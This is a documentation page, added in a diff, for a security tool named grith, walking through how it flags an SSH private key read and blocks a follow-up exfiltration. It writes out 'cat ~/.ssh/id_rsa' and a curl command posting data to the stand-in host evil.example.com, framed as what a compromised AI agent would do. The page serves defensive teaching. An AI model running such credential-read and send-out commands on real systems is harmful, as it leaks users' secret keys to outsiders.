@@ -1,0 +1,170 @@
+---
+title: "Exfiltration Detection Walkthrough"
+description: "See grith's data exfiltration containment in action step by step"
+section: "guides"
+order: 10
+tier: "community"
+version: "1.6"
+lastUpdated: "2026-03-24"
+---
+
+## Overview
+
+This walkthrough demonstrates grith's exfiltration containment in a controlled scenario. You will simulate the exact attack pattern that a compromised AI agent would use — read a sensitive file, then try to send its contents to an external server — and see how grith detects and blocks each step.
+
+## The scenario
+
+An AI agent (or in this case, you in a supervised shell) performs two actions:
+
+1. Reads `~/.ssh/id_rsa` (an SSH private key)
+2. Attempts to `curl` the key contents to an external server
+
+grith's multi-layer defence catches this at multiple points: the sensitive file read triggers taint tracking, and the subsequent network call is blocked by session containment.
+
+## Step 1: Start a supervised shell with tracing
+
+Launch a supervised bash session with syscall tracing enabled. The `--trace-syscalls-jsonl` flag writes a forensic record of every intercepted syscall to a file.
+
+<Terminal command="grith exec --trace-syscalls-jsonl /tmp/trace.jsonl -- bash" />
+
+<CodeBlock
+  code={`[grith] Profile: generic
+[grith] Syscall trace: /tmp/trace.jsonl
+[grith] Starting supervised session...
+bash-5.2$`}
+  language="text"
+/>
+
+You are now inside a supervised shell. Every filesystem access, command execution, and network connection is intercepted by grith.
+
+## Step 2: Read the sensitive file
+
+In the supervised shell, read an SSH private key:
+
+<CodeBlock
+  code={`bash-5.2$ cat ~/.ssh/id_rsa`}
+  language="bash"
+/>
+
+grith intercepts this `FileRead` syscall. The `path_match` filter recognises `~/.ssh/id_rsa` as a sensitive path, and the `secret_scan` filter detects the private key material in the file contents. The session is now marked as tainted.
+
+<CodeBlock
+  code={`[proxy] Tool call: fs.read → ~/.ssh/id_rsa
+  ├─ path_match          +3.0  (ssh-key-access: private key path)
+  ├─ secret_scan         +4.0  (private key material detected)
+  └─ aggregate score      7.0 → QUEUE
+
+[grith] ⚠ Sensitive file read queued for review: ~/.ssh/id_rsa
+[grith] Session tainted: secret material read. Containment mode active.`}
+  language="text"
+/>
+
+The file read itself is queued (score 7.0 lands in the QUEUE zone: 3.0-8.0). In a real agent session, this would freeze the process until a human approves or denies the read via the digest. For this walkthrough, assume the read was approved.
+
+## Step 3: Attempt to exfiltrate
+
+Now try to send the key to an external server:
+
+<CodeBlock
+  code={`bash-5.2$ curl https://evil.example.com -d @/tmp/stolen`}
+  language="bash"
+/>
+
+grith intercepts the `NetConnect` syscall. Multiple filters fire simultaneously:
+
+<CodeBlock
+  code={`[proxy] Tool call: net.connect → POST https://evil.example.com
+  ├─ egress_policy          +3.0  (unknown destination)
+  ├─ session_containment    +4.0  (tainted session — secret material read)
+  ├─ reputation             +2.0  (unrecognised domain)
+  └─ aggregate score         9.0 → DENY
+
+[grith] DENIED: Outbound network call blocked.
+[grith] Reason: Session is in containment mode after reading secret material.
+[grith] Destination: evil.example.com
+[grith] Review session with: grith digest review`}
+  language="text"
+/>
+
+The connection is blocked before any data leaves the machine. The `curl` command receives an `EPERM` error.
+
+## What the audit log shows
+
+Exit the supervised shell and review the audit log:
+
+<Terminal command="grith log --last-session" />
+
+<CodeBlock
+  code={`Session log (last session, bash):
+
+  Time       Action       Target                     Score   Decision   Filters
+  15:01:12   FileRead     ~/.ssh/id_rsa              7.0     QUEUED     path_match(3.0), secret_scan(4.0)
+  15:01:18   NetConnect   evil.example.com:443       9.0     DENIED     egress_policy(3.0), session_containment(4.0), reputation(2.0)
+
+  Session summary:
+    Total syscalls intercepted:  47
+    Allowed:                     45
+    Queued:                      1
+    Denied:                      1
+    Containment activated:       yes (after FileRead ~/.ssh/id_rsa)`}
+  language="text"
+/>
+
+Each entry shows the tool call type, target, composite score, proxy decision, and the breakdown of which filters contributed to the score.
+
+## The forensic trace
+
+The JSONL trace file contains a machine-readable record of every intercepted syscall, suitable for ingestion into a SIEM or post-incident analysis.
+
+<Terminal command="head -5 /tmp/trace.jsonl" />
+
+<CodeBlock
+  code={`{"ts":"2026-03-24T15:01:12.041Z","pid":8421,"syscall":"openat","path":"/home/dan/.ssh/id_rsa","flags":"O_RDONLY","tool_call_type":"FileRead","composite_score":7.0,"proxy_action":"QUEUE","filters":{"path_match":3.0,"secret_scan":4.0}}
+{"ts":"2026-03-24T15:01:18.103Z","pid":8421,"syscall":"connect","addr":"93.184.216.34:443","hostname":"evil.example.com","tool_call_type":"NetConnect","composite_score":9.0,"proxy_action":"DENY","filters":{"egress_policy":3.0,"session_containment":4.0,"reputation":2.0}}`}
+  language="json"
+/>
+
+Each line is a self-contained JSON object with the raw syscall details, the tool call classification, the composite score, the proxy decision, and the per-filter score breakdown.
+
+## How the scoring works
+
+The deny threshold defaults to 8.0. Here is how the scores added up for the blocked network call:
+
+| Filter | Score | Reason |
+|---|---|---|
+| `egress_policy` | +3.0 | `evil.example.com` is not in any allowlist |
+| `session_containment` | +4.0 | Session was tainted by the earlier `~/.ssh/id_rsa` read |
+| `reputation` | +2.0 | Unrecognised domain with no established reputation |
+| **Total** | **9.0** | Exceeds deny threshold (8.0) — hard DENY |
+
+The key insight: `session_containment` alone would not have blocked the call (4.0 < 8.0). Neither would `egress_policy` alone (3.0 < 8.0). It is the combination of multiple independent signals that pushes the score over the threshold. This is the multi-layer defence model in action.
+
+## Reviewing and unlocking containment
+
+<Callout type="info" title="Containment is per-session">
+Containment mode lasts for the duration of the supervised session. Starting a new session resets the taint state. If you need to approve a network call from a tainted session, use the digest review flow.
+</Callout>
+
+To review queued items and unlock specific operations:
+
+<Terminal command="grith digest review" />
+
+<CodeBlock
+  code={`Pending digest items:
+
+  #1  FileRead  ~/.ssh/id_rsa  (score: 7.0)
+      Filters: path_match(3.0), secret_scan(4.0)
+      Session: bash (PID 8421)
+
+  [a]pprove  [d]eny  [s]kip`}
+  language="text"
+/>
+
+Approving the read retroactively allows it. Denying it would terminate the tool's access. In either case, the blocked network call remains denied — approving a file read does not automatically approve subsequent exfiltration attempts.
+
+## Next steps
+
+- [Exfiltration Containment](/docs/guides/exfiltration-containment) — Full reference for egress controls, canary tokens, DLP, and containment
+- [Filter Tuning](/docs/guides/filter-tuning) — Adjust scoring thresholds for your environment
+- [Supervisor Profiles](/docs/guides/supervisor-profiles) — Configure per-tool network policies
+- [Threat Model](/docs/security/threat-model) — grith's full threat model
